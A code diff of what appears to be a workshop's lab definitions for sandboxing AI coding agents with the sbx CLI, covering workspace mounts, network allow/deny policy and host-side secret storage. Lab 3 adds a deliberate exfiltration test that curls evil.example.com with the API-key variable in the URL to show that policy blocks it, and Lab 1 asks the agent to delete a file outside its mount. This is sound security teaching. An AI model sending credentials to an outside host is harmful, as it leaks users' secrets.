@@ -28,7 +28,7 @@ export const questionLabOptions = [
 export const agenda = [
   { time: "0:00", title: "Welcome & the YOLO problem", duration: "10 min" },
   { time: "0:10", title: "Lab 1 — First sandbox", duration: "25 min" },
-  { time: "0:35", title: "Lab 2 — Network policy & templates", duration: "40 min" },
+  { time: "0:35", title: "Lab 2 — Network policy", duration: "35 min" },
   { time: "1:15", title: "Lab 3 — Secrets & credential isolation", duration: "20 min" },
   { time: "1:35", title: "Labs 4–10 — self-paced (clone, app, kits, capstone)", duration: "25+ min" },
   { time: "1:50", title: "Q&A", duration: "10 min" },
@@ -64,92 +64,136 @@ export const labs = [
     time: "25 min",
     folder: "lab-01-first-sandbox",
     githubPath: "lab-01-first-sandbox",
-    description: "Install sbx, boot Claude Code in a microVM, inspect and tear down.",
-    task: `1. Install sbx and run sbx login.
-2. cd into lab-01-first-sandbox/workspace/ and start Claude with sbx run claude . --name my-sandbox.
-3. Ask the agent to create hello.txt in the workspace.
-4. From a second terminal, inspect with sbx ls and sbx exec.
-5. Remove the sandbox with sbx rm.
+    description: "Install sbx, boot Claude Code in a microVM, create files in the workspace, and tear down.",
+    task: `1. Install the sbx CLI and verify the version.
+2. Sign in with sbx login.
+3. cd into lab-01-first-sandbox/workspace/ and start Claude with sbx run claude . --name my-sandbox.
+4. Ask the agent to create hello.txt in the workspace and show its contents.
+5. Ask the agent to delete ../delete-me.txt and observe why that fails outside the workspace mount.
+6. From a second host terminal, inspect the sandbox with sbx ls and sbx exec.
+7. Review sbx policy log and remove the sandbox with sbx rm.
 
-Done when hello.txt exists on your host in workspace/, sbx exec shows a different kernel than your machine, and sbx rm removes the sandbox from sbx ls.`,
+Done when hello.txt exists in workspace/ on the host, delete-me.txt is still present at the lab root, sbx exec shows a VM kernel different from your host, and sbx rm removes my-sandbox from sbx ls.`,
     hints: [
       "Work from lab-01-first-sandbox/workspace/ — mounting the repo root is the most common mistake.",
       "Open a second terminal on the host for sbx ls, sbx exec, and sbx policy log while the agent runs.",
+      "delete-me.txt lives one level above workspace/ — the sandbox only syncs the workspace folder, so the agent cannot remove host files outside that mount.",
       "There is no sbx status — use sbx ls. Success for uname: VM kernel ≠ host kernel.",
       "If Claude won't start: run sbx login and sbx secret set -g anthropic on the host first.",
     ],
     steps: [
       {
-        label: "Install & verify",
-        task: "Install sbx from Docker's tap, print the version, then authenticate with sbx login. Expect a version string and a successful login message.",
-        command: "brew install docker/tap/sbx && sbx version",
+        label: "Install sbx",
+        task: "Trust Docker's Homebrew tap, install sbx, and print the CLI version. Expect a version string with no errors.",
+        command: "brew trust docker/tap\nbrew install docker/tap/sbx\nsbx version",
+      },
+      {
+        label: "Sign in",
+        task: "Authenticate the CLI with your Docker account. Expect a successful login message.",
+        command: "sbx login",
       },
       {
         label: "Start sandbox",
-        task: "cd into workspace/, then boot Claude Code in a named sandbox. Leave this terminal on the agent — use another terminal for host commands.",
-        command: "cd lab-01-first-sandbox/workspace && sbx run claude . --name my-sandbox",
+        task: "Change into workspace/, then boot Claude Code in a named sandbox. Leave this terminal on the agent — use another terminal for host commands.",
+        command:
+          "cd lab-01-first-sandbox/workspace\nsbx run claude . --name my-sandbox",
       },
       {
-        label: "Inspect",
-        task: "On the host: confirm my-sandbox appears in sbx ls and list its network policy. Ask the agent to create hello.txt, then check it appears in workspace/ on the host.",
-        command: "sbx ls && sbx policy ls my-sandbox",
+        label: "Create hello.txt",
+        task: 'In Claude, paste this prompt: "Create a file named hello.txt in this workspace with a one-line greeting, then show me the file contents." Expect hello.txt to appear in workspace/ on the host.',
+        command:
+          '# Claude prompt:\nCreate a file named hello.txt in this workspace with a one-line greeting, then show me the file contents.',
+      },
+      {
+        label: "Workspace boundary",
+        task: 'In Claude, paste this prompt: "Try to delete ../delete-me.txt from this workspace. Report whether it worked and explain why sandbox workspace mounts limit what you can change on the host." Expect the file to remain — the agent cannot delete paths outside the synced workspace/.',
+        command:
+          '# Claude prompt:\nTry to delete ../delete-me.txt from this workspace. Report whether it worked and explain why sandbox workspace mounts limit what you can change on the host.',
+      },
+      {
+        label: "Inspect from host",
+        task: "On the host, confirm my-sandbox is running, read hello.txt from inside the VM, and compare the kernel. Expect hello.txt contents and a kernel string different from your laptop.",
+        command:
+          "sbx ls\nsbx exec my-sandbox -- cat hello.txt\nsbx exec my-sandbox -- uname -r",
       },
       {
         label: "Clean up",
-        task: "Review the last 10 proxy decisions, then force-remove the sandbox. Done when sbx ls no longer lists my-sandbox.",
-        command: "sbx policy log --limit 10 && sbx rm my-sandbox --force",
+        task: "Review recent proxy decisions, then force-remove the sandbox. Expect sbx ls to no longer list my-sandbox.",
+        command: "sbx policy log --limit 10\nsbx rm my-sandbox --force",
       },
     ],
   },
   {
     id: "lab-02",
-    title: "Network Policy · Template · Clone",
-    time: "40 min",
+    title: "Network Policy",
+    time: "35 min",
     folder: "lab-02-network-policy",
     githubPath: "lab-02-network-policy",
-    description: "Block outbound hosts, build a custom template, and preview clone mode.",
-    task: `1. Initialize network policy and deny api.example.com.
-2. Create shell sandbox lab2 and curl the denied host — expect HTTP 403, not a successful connection.
-3. Build and load a custom image from sandbox.Dockerfile (docker build + sbx template load).
-4. Run a sandbox with --template lab2-kit:latest and verify pandas imports inside the VM.
-5. Preview --clone on this Git repo from the repository root.
+    description: "Create a sandbox, prove deny-by-default networking, allow npmjs.com, and manage rules.",
+    task: `1. cd into lab-02-network-policy/ and create a shell sandbox named lab2.
+2. Initialize the balanced network policy profile on the host.
+3. From inside the sandbox, curl https://www.npmjs.com and https://npmjs.org — both should be blocked.
+4. Allow www.npmjs.com, curl again, and confirm the registry responds.
+5. Ask the agent what the latest eslint version on npmjs.com is and verify it can read the registry.
+6. Inspect active network rules scoped to lab2 with sbx policy ls.
+7. Deny www.npmjs.com again and confirm curl is blocked.
+8. Remove the www.npmjs.com network rule with sbx policy rm.
+9. Remove the sandbox when finished.
 
-Done when sbx policy log shows the deny rule matched, curl to the blocked host returns 403, and python3 imports pandas inside the template sandbox.`,
+Done when sbx policy log shows blocked and allowed requests, curl to www.npmjs.com succeeds only while the host is allowed, eslint version is retrieved while allowed, and sbx policy ls reflects each rule change.`,
     hints: [
-      "Run docker build from lab-02-network-policy/ where sandbox.Dockerfile lives — not from workspace/.",
-      "HTTP 403 on curl means the deny rule worked. A timeout or 000 usually means policy was not initialized.",
-      "Local images must be registered with sbx template load before you can pass --template.",
-      "Clone mode (--clone) only applies at create time — you cannot add it to a running sandbox.",
+      "Run commands from lab-02-network-policy/ unless noted — workspace/ is only the mount path for sbx create shell workspace.",
+      "Under balanced policy, npm registry hosts are blocked until you explicitly allow them.",
+      "HTTP 403 or connection failure on curl means the deny rule worked — not a successful page load.",
+      "Use sbx policy ls lab2 to inspect rules for this sandbox plus global rules.",
+      "Remove rules with sbx policy rm network --resource <host> when you are done experimenting.",
     ],
     steps: [
       {
-        label: "Init policy & deny",
-        task: "Initialize the balanced policy profile (once per machine), then deny outbound HTTPS to api.example.com. Expect the deny rule to appear when you run sbx policy ls.",
+        label: "Create sandbox",
+        task: "Change to the lab folder and create a named shell sandbox with the workspace mount. Expect lab2 to appear in sbx ls.",
         command:
-          'cd lab-02-network-policy && sbx policy init balanced && sbx policy deny network "api.example.com"',
+          "cd lab-02-network-policy\nsbx create shell workspace --name lab2 -q",
       },
       {
-        label: "Verify block",
-        task: "Create shell sandbox lab2 with the workspace mount, then curl https://api.example.com from inside the VM. Expect HTTP 403 — proof the proxy blocked the request, not a successful connection.",
-        command:
-          'cd lab-02-network-policy && sbx create shell workspace --name lab2 -q && sbx exec lab2 -- sh -c "curl -s -o /dev/null -w \'%{http_code}\n\' https://api.example.com"',
+        label: "Init balanced policy",
+        task: "Initialize the balanced policy profile on the host (once per machine). Expect sbx policy ls to show the balanced defaults.",
+        command: "sbx policy init balanced",
       },
       {
-        label: "Build template",
-        task: "Build lab2-kit:latest from sandbox.Dockerfile, save it to a tar archive, and load it into sbx. Expect sbx template ls to list lab2-kit:latest.",
+        label: "Prove default deny",
+        task: "Curl both npmjs hostnames from inside the sandbox before any allow rule. Expect non-200 responses or blocked connections — not a normal registry page.",
         command:
-          "cd lab-02-network-policy && docker build -f sandbox.Dockerfile -t lab2-kit:latest . && docker save lab2-kit:latest -o lab2-kit.tar && sbx template load lab2-kit.tar",
+          'sbx exec lab2 -- curl -s -o /dev/null -w "%{http_code}\\n" https://www.npmjs.com\nsbx exec lab2 -- curl -s -o /dev/null -w "%{http_code}\\n" https://npmjs.org',
       },
       {
-        label: "Run template",
-        task: "Start a shell sandbox with --template lab2-kit:latest, then verify the extra Python packages inside the VM. Expect import pandas, numpy, matplotlib to succeed and print kit OK.",
+        label: "Allow www.npmjs.com",
+        task: "Allow outbound HTTPS to www.npmjs.com, then curl it again from the sandbox. Expect HTTP 200 (or another success code) this time.",
         command:
-          'cd lab-02-network-policy && sbx create shell workspace --name lab2-kit --template lab2-kit:latest -q && sbx exec lab2-kit -- python3 -c "import pandas, numpy, matplotlib; print(\'kit OK\')"',
+          'sbx policy allow network www.npmjs.com\nsbx exec lab2 -- curl -s -o /dev/null -w "%{http_code}\\n" https://www.npmjs.com',
       },
       {
-        label: "Clone preview",
-        task: "From the repository root, create a shell sandbox in clone mode on this Git checkout — a dry run before Lab 4. Expect a sandbox-featwork remote on the host after git fetch.",
-        command: "sbx create shell . --name featwork --clone",
+        label: "Query eslint version",
+        task: 'With www.npmjs.com allowed, ask the agent: "What is the latest eslint version published on npmjs.com? Fetch the registry and cite the version." Expect a current eslint version. Verify with sbx exec lab2 -- curl -s https://registry.npmjs.org/eslint/latest if needed.',
+        command:
+          '# Claude prompt:\nWhat is the latest eslint version published on npmjs.com? Fetch the registry and cite the version.\n\n# Verify from the host:\nsbx exec lab2 -- curl -s https://registry.npmjs.org/eslint/latest',
+      },
+      {
+        label: "Inspect policy",
+        task: "List network rules visible to lab2. Expect your allow entry for www.npmjs.com plus the balanced defaults.",
+        command: "sbx policy ls lab2\nsbx policy log lab2 --limit 10",
+      },
+      {
+        label: "Deny again",
+        task: "Block www.npmjs.com again and confirm curl fails. Expect the request to be denied as before.",
+        command:
+          'sbx policy deny network www.npmjs.com\nsbx exec lab2 -- curl -s -o /dev/null -w "%{http_code}\\n" https://www.npmjs.com',
+      },
+      {
+        label: "Remove rule",
+        task: "Remove the www.npmjs.com network resource from policy, then tear down sandboxes. Expect sbx policy ls to no longer list that host.",
+        command:
+          'sbx policy rm network --resource www.npmjs.com\nsbx rm lab2 --force',
       },
     ],
   },
@@ -159,46 +203,53 @@ Done when sbx policy log shows the deny rule matched, curl to the blocked host r
     time: "20 min",
     folder: "lab-03-secrets",
     githubPath: "lab-03-secrets",
-    description: "Store credentials on the host, verify sentinel values inside the VM.",
+    description: "Store credentials on the host, verify sentinel values inside the VM, and confirm proxy injection.",
     task: `1. Store your real Anthropic key on the host with sbx secret set -g anthropic — never put it in a file in this repo.
-2. Start sbx run claude . --name lab3 from lab-03-secrets/workspace/.
-3. sbx exec and echo $ANTHROPIC_API_KEY — output must be proxy-managed, never sk-ant-….
+2. cd into lab-03-secrets/workspace/ and start sbx run claude . --name lab3.
+3. From a second terminal, echo $ANTHROPIC_API_KEY inside the VM — output must be proxy-managed, never sk-ant-….
 4. curl the Anthropic API from inside the VM and confirm HTTP 200.
-5. Remove the sandbox with sbx rm lab3.
+5. Attempt to exfiltrate the sentinel to a blocked host — expect the request to fail.
+6. Remove the sandbox with sbx rm lab3.
 
-Done when the sentinel value appears in the VM, the API check returns HTTP 200, and your real key never appears in terminal output inside the sandbox.`,
+Done when the sentinel value appears in the VM, the API check returns HTTP 200, exfiltration is blocked, and your real key never appears in terminal output inside the sandbox.`,
     hints: [
       "Use a valid Anthropic key — dummy keys show proxy-managed but the API check returns 401.",
       "API verification must run via sbx exec lab3 — not on the host.",
       "If lab3 does not exist yet: start it with sbx run claude . --name lab3 from workspace/ first.",
-      "Optional exfil test: curl https://evil.example.com from inside the VM should be blocked by policy.",
+      "The exfiltration curl to evil.example.com should be blocked by network policy — the sentinel never leaves via an unapproved host.",
     ],
     steps: [
       {
         label: "Store on host",
-        task: "Run sbx secret set -g anthropic on the host and paste your key when prompted. The key stays in the OS keychain — not in the repo.",
-        command: "sbx secret set -g anthropic",
+        task: "Run sbx secret set on the host and paste your key when prompted. Expect the key to stay in the OS keychain — not in the repo.",
+        command: "sbx secret set -g anthropic\nsbx secret ls",
       },
       {
         label: "Start sandbox",
         task: "From lab-03-secrets/workspace/, boot Claude in a named sandbox. Leave this terminal on the agent — use another terminal for sbx exec checks.",
-        command: "cd lab-03-secrets/workspace && sbx run claude . --name lab3",
+        command: "cd lab-03-secrets/workspace\nsbx run claude . --name lab3",
       },
       {
         label: "Check sentinel",
-        task: "Echo ANTHROPIC_API_KEY inside the running sandbox. Output must be exactly proxy-managed — if you see sk-ant-…, stop and fix your secret setup.",
-        command: "sbx exec lab3 -- bash -c 'echo $ANTHROPIC_API_KEY'",
+        task: "Echo ANTHROPIC_API_KEY inside the running sandbox. Expect exactly proxy-managed — if you see sk-ant-…, stop and fix your secret setup.",
+        command: 'sbx exec lab3 -- bash -c \'echo "$ANTHROPIC_API_KEY"\'',
       },
       {
         label: "Verify proxy",
-        task: "Confirm the sentinel is proxy-managed, then curl the Anthropic API from inside the VM. Expect HTTP 200 — the host proxy injects your real key on the way out.",
+        task: "Confirm the sentinel, then curl the Anthropic API from inside the VM. Expect HTTP 200 — the host proxy injects your real key on the way out.",
         command:
-          "sbx exec lab3 -- bash -c 'test \"$ANTHROPIC_API_KEY\" = \"proxy-managed\" && curl -s -o /dev/null -w \"HTTP %{http_code}\\n\" https://api.anthropic.com/v1/messages -H \"Content-Type: application/json\" -H \"x-api-key: $ANTHROPIC_API_KEY\" -H \"anthropic-version: 2023-06-01\" -d \"{\\\"model\\\":\\\"claude-3-5-haiku-latest\\\",\\\"max_tokens\\\":1,\\\"messages\\\":[{\\\"role\\\":\\\"user\\\",\\\"content\\\":\\\"hi\\\"}]}\"'",
+          'sbx exec lab3 -- bash -c \'test "$ANTHROPIC_API_KEY" = "proxy-managed"\'\nsbx exec lab3 -- curl -s -o /dev/null -w "HTTP %{http_code}\\n" https://api.anthropic.com/v1/messages -H "Content-Type: application/json" -H "x-api-key: $ANTHROPIC_API_KEY" -H "anthropic-version: 2023-06-01" -d "{\\"model\\":\\"claude-3-5-haiku-latest\\",\\"max_tokens\\":1,\\"messages\\":[{\\"role\\":\\"user\\",\\"content\\":\\"hi\\"}]}"',
+      },
+      {
+        label: "Block exfiltration",
+        task: "Try sending the sentinel to a blocked host from inside the VM. Expect the curl to fail — network policy blocks unapproved destinations.",
+        command:
+          'sbx exec lab3 -- curl -s -o /dev/null -w "HTTP %{http_code}\\n" "https://evil.example.com?k=$ANTHROPIC_API_KEY"',
       },
       {
         label: "Clean up",
-        task: "Remove sandbox lab3 when verification passes. On shared machines, also run sbx secret rm -g anthropic after the lab.",
-        command: "sbx rm lab3 --force",
+        task: "Remove sandbox lab3 when verification passes. On shared machines, also run sbx secret rm after the lab.",
+        command: "sbx rm lab3 --force\nsbx secret rm -g anthropic --force",
       },
     ],
   },
@@ -271,7 +322,7 @@ Done when curl prints 200 and the workshop site loads in the browser.`,
         label: "Build template",
         task: "Build the Cursor agent image, export to tar, load into sbx. Takes a few minutes — wait for sbx template load to finish without errors.",
         command:
-          "cd customize/templates/workshop-app-cursor && docker build -t workshop-app-cursor:v1 . && docker image save workshop-app-cursor:v1 -o workshop-app-cursor.tar && sbx template load workshop-app-cursor.tar",
+          "cd customize/templates/workshop-app-cursor\ndocker build -t workshop-app-cursor:v1 .\ndocker image save workshop-app-cursor:v1 -o workshop-app-cursor.tar\nsbx template load workshop-app-cursor.tar",
       },
       {
         label: "Run stack",
